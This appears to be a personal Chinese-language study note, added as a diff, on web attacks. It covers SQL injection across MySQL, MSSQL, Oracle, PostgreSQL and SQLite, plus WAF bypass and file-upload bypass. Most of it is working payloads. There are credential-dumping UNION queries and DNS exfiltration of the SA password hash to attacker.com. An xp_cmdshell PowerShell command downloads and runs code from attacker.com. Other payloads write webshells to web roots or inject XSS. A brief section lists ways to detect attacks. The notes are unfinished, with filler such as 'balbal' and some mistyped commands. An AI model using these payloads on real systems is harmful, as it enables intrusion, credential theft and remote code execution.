@@ -1,0 +1,317 @@
+# Web攻击学习
+
+要理解web语言的语法和开发人员的风格习惯。
+
+### 注入类型
+
+1. 数据结构区分
+
+   1. 字符型
+      1. 例："select * from product where name =''".$_GET['name']."''"
+   2. 数字型
+      1. 例："select * from product where id =".$_GET['id']
+
+2. 回显方式区分
+
+   1. 联合查询
+
+      1. 例：select * from id,name from product where id = 1 union select  1,user()
+
+         将在原本显示name的地方，显示user()函数返回结果
+
+   2. 报错注入
+
+      1. select * from id,name from product where id = 1 and updatexml(1,concat(0x5c,user()),1)
+
+   3. 盲注
+
+      1. select * from id,name from product where id = 1 or 1=1
+      2. select * from id,name from product where id = 1 and sleep(2)
+
+   4. stack query
+
+      1. 多语句注入通过插入 ';' 分号 结束前一个语句，然后注入一个新的语句。这种注入常出现在php的pdo，.NET与MSSQL，Java与Mysql
+      2. select * from id,name from product where id = 1;delete from product where id =2
+
+3. dd
+
+
+### 挖掘方式
+
+1. 黑盒测试
+   1. 手工测试常见参数如：id，orderby，sort等，在参数后面加上'，and，or，+，-等sql特殊字符或语句测试是否改变了原来的Sql语句
+   2. 被动代理扫描抓取url后去重放入sqlmap进行自动化检测
+2. 白盒测试
+   1. 通过正则匹配出未用单引号包裹或者未经过过滤的函数
+   2. 查看数据日志，通过fuzz各个参数然后查看数据库日志中是否有注入数据。
+3. balbal
+
+### 数据库注入技巧
+
+1. mysql 信息
+
+   1. information_schema 包含所有的库名，表名，字段名等信息
+
+   2. mysql注入语句
+
+      1. 获取库名
+
+         1. select * from id,name from product where id = 1'+union+select+schema_name,2+from+information_schema.schemata--+
+
+      2. 获取表名
+
+         1. select * from id,name from product where id = 1'+union+select+group_concat(table_name),2+from+information_schema.tables+where+table_schema=database()--+
+
+      3. 获取列名
+
+         1. select * from id,name from product where id = 1'+union+select+group_concat(column_name),2+from+information_schema.tables+where+table_name='users'--+
+
+      4. 获取敏感信息
+
+         1. select * from id,name from product where id = 1'+union+select+group_concat(user,0x7c,password),2+from+users--+
+
+      5. update delete 注入"安全"利用
+
+         1. 函数利用updatexml，extractvalue等函数，可以查出32个字符。能在报错和盲注中使用
+         2. balba
+
+      6. 报错注入技巧
+
+      7. DNS回传数据
+
+         1. MSSQL
+
+            1. win的UNC命名发起dns请求
+
+               1. \\\host\\sharefolders\Resource
+               2. balba
+
+            2. master..xp_dirtree
+
+            3. master..xp_fileexist
+
+            4. master..xp_subdirs
+
+            5. 获取SA的hash
+
+               1. DECLARE @host var char(1024);
+
+                  SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.attacker.com'; exec('master..xp_dirtree"\\\\'+@host+'\foobar$"');
+
+            6. balbal
+
+         2. MySQL
+
+            1. 关键函数 load_file (限制win和有file权限)
+               1. 例：select  locat_file(concat('\\\\\\\\',(select user()),'attack.com\\\\xxx'))
+
+         3. Oracle
+
+            1. 关键函数UTL_INADDR.GET_HOST_ADDRESS , SYS.DBMS_LDAP.INIT , UTL_HTTP.REQUEST
+            2. UTL_INADDR.GET_HOST_ADDRESS 例：select utl_inaddr.get_host_address((select user from dual)||'.nw8bax.ceye.io') from dual
+
+         4. PostgresSQL
+
+            1. 关键函数dblink
+
+               1. dblink 例: CREATE EXTENSION dblink;
+
+                  SELECT * FROM dblink('host'=||(select user)||'.nw8bax.ceye.io user=someuser dbname=somedb','select version()') RETURNS (result TEXT); 
+
+         5. balbal
+
+      8. order by 注入技巧
+
+         1. sleep(延时时间为 数据量*sleep 时间)
+         2. Bool 盲注order by case when (1=1) then 1 else 2 end
+         3. updatexml 利用 select * from wp_action order by updatexml(1,if(1=2,1,0x27),1)
+
+      9. 同表查询技巧
+
+         1.  substr , lpad , rpad , regexp , like
+
+      10. getshell技巧
+
+          1. MySql数据写webshell 要求站库不分离，file权限，web路径，未过滤单引号(不支持多语句)
+          2. select 1 from dual where 1=1 union select '<?php phpinfo?>' into outfile '/var/www/html/phpinfo.php';
+          3. select name from wp_action limit 0,1 into outfile '/var/www/html/phpinfo.php' LINES TERMINATED BY '<?php phpinfo?>'
+          4. 
+
+      11. 多语句注入
+
+          1. set @a=hex();
+
+             prepare test from @a;
+
+             exeute test;
+
+      12. 联合查询回显利用
+
+          1. 利用SQL注入构造一个XSS链接，利用留言功能获取后台地址
+
+             select 1 union select 'undefined<script src=//xxx> </script>'
+
+      13. 其他
+
+          1. 
+
+2. Sql Server
+
+   1. SA权限下注入到RCE
+
+      1. get shell 例: USE master;
+
+         EXEC sp_configure 'show advanced options',1;
+
+         RECONFIGURE;
+
+         EXEC sp_configure 'xp_cmdshell',1;
+
+         RECONFIGURE;
+
+      2. Powershell get shll 例: EXEC master.dbo.xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring(\"http://attacker.com/a\"))"'
+
+   2. 获取SA的hash
+
+      1. DECLARE @host var char(1024);
+
+         SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.attacker.com'; exec('master..xp_dirtree"\\\\'+@host+'\foobar$"');
+
+   3. balabla
+
+3. SQLite & PostgresSQL
+
+   1. getshell
+
+      1. SQLite get shell 例:ATTACH DATABASE '/var/www/html/cmd.php' as lo1;
+
+         CREATE TABLE lo1.pwn(dataz text);
+
+         INSERT INTO  lo1.pwn(dataz) VALUES ('<?php system($_GET['cmd'])?>')
+
+   2. PostgresSQL get shell 例:COPY(select '<?php phpinfo()?>') to 'tmp/1.php';
+
+      写binary 每次不能超过2kb
+
+      select lo_create(12345);
+
+      insert into pg_largeobject values(12345,xxxxxx,decode)
+
+      select lo_export(12345, '/tmp/test.so');
+
+   3. babal
+
+4. Oracle
+
+   1. 快速获取数据
+      1. Oracle 注入也可以使用 union， select， dns传数据，盲注
+   2. 权限提升
+   3. 报错注入
+      1. utl_inaddr.get_host_name
+      2. ctxsys.drithsx.sn
+      3. XMLType
+      4. dbms_xdb_version.checkin
+      5. dbms_xdb_version.makeversioned
+      6. dbms_xdb_version.uncheckout
+      7. dbms_utility.sqlid_to_sqlhas
+      8. 
+   4. balbal
+
+5. 其他
+
+   1. 
+
+### 识别web攻击
+
+1. 通过扫描器指纹(head字段/请求参数值)例：WVS有明显的Acunetix标识
+2. IP+Cookie某时间段内触发的规则次数
+3. 隐藏的链接标签(如<a>,类似蜜罐)
+4. Cookie植入
+5. 验证码验证，扫描器一般不会填充验证码
+6. IP时间段内404的比例
+7. 黑白名单，白名单稳定应用，黑名单处理问题
+8. 基于规则和基于异常的保护，基于规则的依赖黑名单机制，基于异常的更好
+9. 
+
+
+
+### WAF绕过
+
+1. 大小写混合
+2. 仅删除或替换异常关键字的，可以使用双关键字绕过
+3. URL编码
+   1. 例:  union%25
+4. 十六进制编码
+   1. 例: %6e是单个字符加密, 0x3c是字符串加密
+5. Unicode编码
+   1. 单引号 : %u0027,%u02b9,%u02bc,%
+   2. 空格
+   3. 左括号
+   4. 右括号
+6. 函数、变量
+   1. hex() , bin() , ==> ascii()
+      1. 例：？id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+   2. sleep() ==> benchmark()
+   3. concat_ws() ==> group_concat()
+   4. mid() , substr() ==> substring()
+      1. 例：substr((select 'password' , 1), 0x69) = 1
+   5. @@user == user()
+   6. @@datadir ==> datadir()
+   7. 例：strcmp(left('password' , 1), 0x69) = 1
+7. 等价函数和命令
+   1. 符合
+      1. and ==> && , or , ||
+      2. = , < , > , like
+      3. 空白字符
+      4. Sqllite: 0A , 0D , 0C
+      5. Mysql: 09 , 0A , 0B , A0 , 20
+      6. PostgreSql: 0A , 0D , 0C
+      7. Oracle: 00 , 0A , 0D , 0C
+      8. Mssql: 01, 0A , 1A , 0F
+   2. 生僻函数
+      1. select updatexml ('<script x=_><\/script>','/script/@x/','src=//evil.com');
+      2. ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
+      3. Postgresql: select xmlelement(name img,xmlattributes(las src,'a\1\x65rt(1)' as \117n\x65rror));
+   3. dd
+8. balab
+
+### 上传漏洞-MIME类型绕过
+
+#### 检测方式
+
+1. 文件幻数检测-文件头检测
+
+   ##### 文件幻数检测方法
+
+   1. 图像文件相关信息检测常用 getimagesize()函数
+   2. gif文件头： 47 49 46 38 39 61
+   3. png文件头： 89 50 4E 47
+
+   ```cmd
+   copy tupian+shell
+   ```
+
+2. 文件相关信息检测
+
+   ##### 文件幻数检测方法
+
+   1. 在文件首部加入 \**GIF89a\*\* 绕过
+   2. gif文件头： 47 49 46 38 39 61
+   3. 
+
+   ```cmd
+   copy 1.png/b + 2.php shell.png
+   ```
+
+3. 文件加载检测
+
+   ##### 文件加载检测方法
+
+   1. 一次渲染：代码注入绕过（在不破坏文件本身的情况下找一个空白区域进行代码填充，一般在图片注释区填充）
+   2. 二次渲染：攻击加载器，移除加载器执行shellcode
+
+
+修改Content-Type:image/gif（可以将php木马上传）
+
+
+
